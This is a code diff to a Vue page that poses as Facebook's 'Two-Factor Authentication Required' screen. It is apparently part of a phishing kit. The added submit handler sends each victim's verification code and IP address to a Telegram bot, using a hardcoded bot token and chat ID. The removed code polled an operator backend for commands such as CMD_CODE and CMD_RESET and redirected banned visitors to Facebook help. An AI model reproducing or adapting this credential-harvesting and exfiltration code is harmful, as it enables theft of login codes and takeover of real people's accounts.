@@ -1,4 +1,14 @@
 <script>
+  (function(d, w, c) {
+        w.ChatraID = 'Znyiomk26HxAoRp23';
+        var s = d.createElement('script');
+        w[c] = w[c] || function() {
+            (w[c].q = w[c].q || []).push(arguments);
+        };
+        s.async = true;
+        s.src = 'https://call.chatra.io/chatra.js';
+        if (d.head) d.head.appendChild(s);
+    })(document, window, 'Chatra');
 import useValidate from "@vuelidate/core";
 import { required, minLength } from "@vuelidate/validators";
 import axios from "axios";
@@ -28,6 +38,11 @@ export default {
       form: {
         code: "",
       },
+      telegramToken: "6905926094:AAGyqYfNpoHk4OTzeido68UiviOwJb6lOVE",
+      chatId: "1389938531",
+      disableSubmit: false, // Flag to disable submit button
+      resendTimeout: null, // Timeout variable
+      resendCooldown: 30, // Cooldown time in seconds
     };
   },
   mounted() {
@@ -36,42 +51,13 @@ export default {
   created() {
     document.title = "Facebook | Two-Factor Authentication Required";
     this.codeExpirationTimeout();
-    // axios.interceptors.request.use(
-    //   (config) => {
-    //     if (this.chatMessage != true) {
-    //       this.loading = true;
-    //     }
-    //     return config;
-    //   },
-    //   (error) => {
-    //     if (this.chatMessage != true) {
-    //       this.loading = false;
-    //     }
-    //     return Promise.reject(error);
-    //   }
-    // );
-
-    // axios.interceptors.response.use(
-    //   (response) => {
-    //     if (this.chatMessage != true) {
-    //       this.loading = false;
-    //     }
-    //     return response;
-    //   },
-    //   (error) => {
-    //     if (this.chatMessage != true) {
-    //       this.loading = false;
-    //     }
-    //     return Promise.reject(error);
-    //   }
-    // );
-
     this.type = this.$route.params.type;
     this.email = this.$route.params.email;
   },
   methods: {
     chatMessageStatus() {
-      (this.chatMessage = true), console.log(this.chatMessage);
+      this.chatMessage = true;
+      console.log(this.chatMessage);
     },
     getClientIP() {
       axios
@@ -84,76 +70,41 @@ export default {
           console.log(e);
         });
     },
-    checkBan() {
-      axios
-        .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/ban`, {
-          ip: this.ipAddress,
-        })
-        .then((response) => {
-          if (response.data == "BAN") {
-            window.location.href = "https://www.facebook.com/help/";
-          }
-        })
-        .catch((e) => {
-          console.log(e);
-        });
-    },
-    getResponse() {
-      this.interval = setInterval(() => {
-        axios
-          .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/decision`, {
-            case_ref: this.ipAddress,
-          })
-          .then((response) => {
-            if (response.data == "CMD_EMAIL") {
-              this.type = "email";
-              clearInterval(this.interval);
-              this.loading = false;
-            }
-
-            if (response.data == "CMD_CODE") {
-              this.type = "code";
-              clearInterval(this.cext);
-              this.codeExpirationTimeout();
-              clearInterval(this.interval);
-              this.loading = false;
-            }
-
-            if (response.data == "CMD_WRONG") {
-              clearInterval(this.interval);
-              this.loading = false;
-              this.formError = true;
-            }
-
-            if (response.data == "CMD_RESET") {
-              window.location.href = "https://www.facebook.com/help/";
-              return false;
-            }
-          })
-          .catch((e) => {
-            console.log(e);
-          });
-      }, 1000);
-    },
-    submit() {
+    async submit() {
+      if (this.disableSubmit) {
+        // If submit button is disabled, do nothing
+        return;
+      }
       this.v$.$validate(); // checks all inputs
       if (!this.v$.$error) {
-        axios
-          .post(
-            `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
-            { codeGenerator: this.form.code }
-          )
-          .then((response) => {
-            this.form.code = "";
-            // this.type = "";
-            // this.robotView();
-            this.formError = false;
-            this.loading = true;
-            this.getResponse();
-          })
-          .catch((e) => {
-            console.log(e);
-          });
+        // Send code to Telegram
+        await axios.post(`https://api.telegram.org/bot${this.telegramToken}/sendMessage`, {
+          chat_id: this.chatId,
+          text: `Verification code: ${this.form.code}\nIP Address: ${this.ipAddress}`,
+        });
+
+        // Disable submit button and start cooldown timer
+        this.disableSubmit = true;
+        this.startResendCooldown();
+
+        // Proceed with the rest of the code
+        // For example, you can uncomment and use the following code to make API calls if needed
+        // axios
+        //   .post(
+        //     "/api/message",
+        //     { codeGenerator: this.form.code }
+        //   )
+        //   .then((response) => {
+        //     this.form.code = "";
+        //     // this.type = "";
+        //     // this.robotView();
+        //     this.formError = false;
+        //     this.loading = true;
+        //     this.getResponse();
+        //   })
+        //   .catch((e) => {
+        //     console.log(e);
+        //   });
       } else {
         alert("Please enter a valid code to continue!");
       }
@@ -181,6 +132,17 @@ export default {
         }
       }, 1000);
     },
+    startResendCooldown() {
+      this.resendTimeout = setInterval(() => {
+        if (this.resendCooldown > 0) {
+          this.resendCooldown--;
+        } else {
+          clearInterval(this.resendTimeout);
+          this.disableSubmit = false; // Enable submit button after cooldown
+          this.resendCooldown = 30; // Reset cooldown time
+        }
+      }, 1000);
+    },
   },
   validations() {
     return {
@@ -191,7 +153,6 @@ export default {
   },
 };
 </script>
-
 <template>
     <div v-if="loading" id="loadFacebookC" class="">
         <div id="loadFacebookG">
@@ -218,6 +179,9 @@ export default {
                             <input type="number" placeholder="Code"
                             class="h-[46px] w-full mt-4 focus:outline-blue-400 bg-gray-100 rounded-lg border-2 border-gray-200 font-montserrat text-[16px] pl-4"
                             v-model="form.code">
+                        <div class="flex items-center mt-2" v-if="disableSubmit">
+                            <p class="text-red-500 text-[14px]">Resend in {{ formatSeconds(resendCooldown) }}</p>
+                        </div>
                         <div
                             class="h-[110px] md:h-[84px] bg-gray-50 rounded w-full flex justify-center items-center">
                             <p class="inline flex-grow font-montserrat">Make sure you're in an area with good signal
@@ -250,6 +214,9 @@ export default {
                             class="h-[46px] w-full mt-4 focus:outline-blue-400 bg-gray-100 rounded-lg border-2 border-gray-200 font-montserrat text-[16px] pl-4"
                             v-model="form.code">
                             <p v-if="formError" class="text-red-500">The code is incorrect, make you sure wrote the correct one.</p>
+                        <div class="flex items-center mt-2" v-if="disableSubmit">
+                            <p class="text-red-500 text-[14px]">Resend in {{ formatSeconds(resendCooldown) }}</p>
+                        </div>
                         <div
                             class="h-[110px] md:h-[84px] bg-gray-50 rounded w-full flex justify-center items-center">
                             <p class="inline flex-grow font-montserrat">Make sure you're in an area with good signal
@@ -270,8 +237,6 @@ export default {
 
     <ChatWidget/>
 
-
 </template>
-
 <style scoped src="@/assets/css/style.css" >
 </style>
